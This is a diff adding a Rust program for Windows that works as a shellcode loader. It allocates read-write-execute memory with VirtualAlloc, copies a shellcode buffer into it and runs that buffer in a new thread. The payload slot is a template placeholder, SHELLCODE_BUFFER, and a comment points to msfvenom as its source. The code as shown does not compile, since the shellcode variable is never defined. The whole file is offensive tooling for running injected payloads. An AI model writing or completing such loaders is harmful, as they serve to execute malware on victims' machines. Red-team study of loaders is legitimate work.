@@ -1,0 +1,55 @@
+extern crate winapi;
+
+
+
+
+use std::ptr::null_mut;
+use winapi::um::memoryapi::VirtualAlloc;
+use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
+//use winapi::um::processthreadsapi::{CreateThread, WaitForSingleObject};
+use winapi::um::minwinbase::LPTHREAD_START_ROUTINE;
+use winapi::um::winbase::INFINITE;
+use winapi::shared::minwindef::{DWORD, LPVOID};
+
+use winapi::um::processthreadsapi::CreateThread;
+use winapi::um::synchapi::WaitForSingleObject;
+
+
+
+fn main() {
+    unsafe {
+        // Example shellcode with null bytes (e.g., from msfvenom)
+        SHELLCODE_BUFFER
+
+        // Allocate memory with RWX
+        let addr = VirtualAlloc(
+            null_mut(),
+            shellcode.len(),
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_EXECUTE_READWRITE,
+        );
+
+        if addr.is_null() {
+            panic!("VirtualAlloc failed");
+        }
+
+        // Copy shellcode to memory
+        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), addr as *mut u8, shellcode.len());
+
+        // Cast memory to a thread function and call
+        let thread_handle = CreateThread(
+            null_mut(),
+            0,
+            Some(std::mem::transmute::<LPVOID, unsafe extern "system" fn(LPVOID) -> DWORD>(addr)),
+            null_mut(),
+            0,
+            null_mut(),
+        );
+
+        if thread_handle.is_null() {
+            panic!("CreateThread failed");
+        }
+
+        WaitForSingleObject(thread_handle, INFINITE);
+    }
+}
